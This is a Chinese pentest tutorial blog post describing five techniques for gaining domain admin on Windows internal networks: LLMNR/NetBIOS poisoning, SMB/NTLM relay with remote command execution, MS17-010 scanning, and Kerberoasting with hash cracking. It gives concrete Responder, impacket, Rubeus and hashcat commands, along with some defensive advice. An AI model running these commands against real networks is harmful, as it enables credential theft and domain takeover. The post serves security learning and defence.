# 快速在内部网络上获得域管理员的五种方式-老套路

## 讲在前面：

以笔者的的渗透测试经历来看，某些企业的内部网络竟然会不安全到笔者都怀疑，当然这也不足为奇，在建设域环境之初就使用默认配置，未及时安装补丁或没有采取基本的防御措施，虽然有时候渗透测试人员必须努力一点才能获得对内部域网络的访问权限，在此笔者列出国外研究者列出的快速获取域管理员的五种方式

**注意：**

列表例子仅作为学习参考和加强防守，未对以下漏洞进行风险评级。

## **Netbios和LLMNR投毒**

**攻击原理：**

NetBIOS和LLMNR这两个协议对于没有DNS的工作站系统来说是很有帮助的，使其对网络上的主机请求进行响应，但同时这也为攻击者提供了可趁之机。问题出在当人们输入不存在的、包含错误的或者DNS中没有主机名时，本机就会使用这两个协议在网络上搜索对应的主机。这些协议的本质定义了本地网络上的任何主机都可以回答请求。作为攻击者，我们能够做到代替网络上任何不存在的主机回答请求，并诱骗用户来搜索我们。

使用kali的Responder集成工具。kali默认安装

```text
responder -I eth0 -f      #-I指定使用的网卡，-f允许攻击者查看受害者的主机指纹
```

![](https://img-blog.csdnimg.cn/20201005133951317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

开启毒化，靶机端只要随便输入不能解析的名称即可。

![](https://img-blog.csdnimg.cn/20201005134048797.png)

可以看到，kali上已经收到了靶机的NTLMv2的hash值，该值被存放到了/usr/share/responder/logs/ 目录下

![](https://img-blog.csdnimg.cn/20201005134212412.png)

![](https://img-blog.csdnimg.cn/20201005133401203.png)

破解密码可以尝试使用johnthe ripper进行破解NTLMv2，kali默认已安装，启动命令：

```text
john SMBv2-NTLMv2-SSP-10.80.0.111.txt
```

![](https://img-blog.csdnimg.cn/20201005134605682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

**防御措施**

为了防止在局域网内遭到NetBIOS名称欺骗和LLMNR欺骗攻击，可以考虑关闭NetBIOS和LLMNR服务。不过在关闭这些服务以后，可能用户的一些正常需求会受到影响。

## **中继攻击**

在尝试中继攻击时，笔者比较喜欢使用impacket工具包，稳定可靠，有人维护，而何乐而不为？

### **smb中继**

这个模块最初由cDc发现并将其用于SMB中继攻击。对于接收到的每个连接，它将选择下一个目标并尝试中继凭证。另外它将首先根据连接到我们的客户机进行身份验证。脚本是通过调用SMB和HTTP服务器，连接到指定函数，然后使用smbclient部分来实现的。它应该可以在任何LM兼容级别上工作。

其中一种方法：

使用RunFinger.py脚本扫描域内机器的SMB签名的开放情况：

```text
python RunFinger.py  -i 10.80.0.1/24
```

![](https://img-blog.csdnimg.cn/2020100513551367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)  
修改responder配置然后启动即可

![](https://img-blog.csdnimg.cn/20201005135817755.png)![](https://img-blog.csdnimg.cn/20201005135838476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

开启relay

```text
python MultiRelay.py  -t 10.80.0.111 -u ALL
```

在域内主机上传递一个smb流量：

![](https://img-blog.csdnimg.cn/20201005140328351.png)

这里笔者未能显示回来数据，使用纯净环境进行实验即可。

impacket方法：

```text
./smbrelayx.py -h <Client2 IP> -c Command
```

![](https://img-blog.csdnimg.cn/20201005140539504.png)

这里笔者未能显示回来数据，使用纯净环境进行实验即可。

使用MSF内置smbrelay模块也可以。这里参考：[中继攻击](https://blog.csdn.net/whatday/article/details/107698383#SMB%20Relay%EF%BC%88SMB%E4%B8%AD%E7%BB%A7%EF%BC%89%E6%94%BB%E5%87%BB)

**防御**：

阻止这种攻击的唯一方法是执行服务器SPN检查和或签名。如果针对目标的身份验证成功，则针对本地smbserver设置客户端身份验证成功以及有效的连接。设置本地smbserver功能由用户决定。一种选择是设置与受害者认为连接到有效SMB服务器的任何文件的共享。所有这些都是通过smb.conf文件或编程方式完成的。

### **ntlm中继**

NTLM身份验证是基于质询-响应的协议。质询响应协议使用通用的共享机密（在本例中为用户密码）对客户端进行身份验证。服务器发送质询，客户端对这个质询进行回复。如果质询与服务器计算的质询匹配，则接受身份验证。NTLM身份验证是一个复杂的协议，在这里它是如何简化的。可以在[http://davenport.sourceforge.net/ntlm.html](http://davenport.sourceforge.net/ntlm.html)上找到非常好的详细说明。简单的来说：在上述情况下可以直接用现有的 hash 去尝试重放指定的机器

```text
 ./ntlmrelayx.py -t <指定的被攻击 IP> 
```

```text
 ./ntlmrelayx.py -t smb://192.168.52.143 -c whoami -smb2support   *利用-c选项来在目标主机上面执行命令：*
```

这里不赘述已有的方法，国内已有十分优秀的实用文章进行介绍：：[中继攻击](https://blog.csdn.net/whatday/article/details/107698383#SMB%20Relay%EF%BC%88SMB%E4%B8%AD%E7%BB%A7%EF%BC%89%E6%94%BB%E5%87%BB)

## [MS17-010](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS17-010/ms17_010_eternalblue.rb)

这个漏洞的危害之大，影响范围之广在这里就不进行赘述了，即使到今天，也依然是在内网渗透必不可缺的方式之一，我很惊讶于居然还有企业没给自己的计算机安装对此漏洞的补丁。

可以使用nmap的探测脚本：

```text
nmap --script smb-vuln-ms17-010 192.168.1.1  探测永痕之蓝
```

笔者这里不展开介绍各式各类的利用MS17-010的脚本、方法。包括但不限于powershell，go，py，MSF,CS插件等等都可以利用

## Kerberoasting

这里参考该文章：国内优秀研究员对此进行了非常形象生动的描述：[kerberoasting](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/)

利用的过程：

1. 查询SPN，找到有价值的SPN，需要满足以下条件：
   * 该SPN注册在域用户帐户\(Users\)下
   * 域用户账户的权限很高
2. 请求TGS
3. 导出TGS
4. 暴力破解

实验环境下：

先在Administrator账户下注册一个SPN服务

```text
setspn.exe -U -A VNC/DC1.test.com Administrator
```

请求TGS

```text
$SPNName = 'MSSQLSvc/DC1.test.com'Add-Type -AssemblyNAme System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
```

使用Rubeus导出

```text
Rubeus.exe kerberoast
```

使用hashcat破解的参数如下：

```text
hashcat -m 13100 /tmp/hash.txt /tmp/password.list -o found.txt --force
```

## **mitm6**

**笔者在复现该漏洞时发现国内并没有一个文章是在国外研究得基础上进行深入的说明的，故笔者这里留空，待笔者研究一番后再次更新**

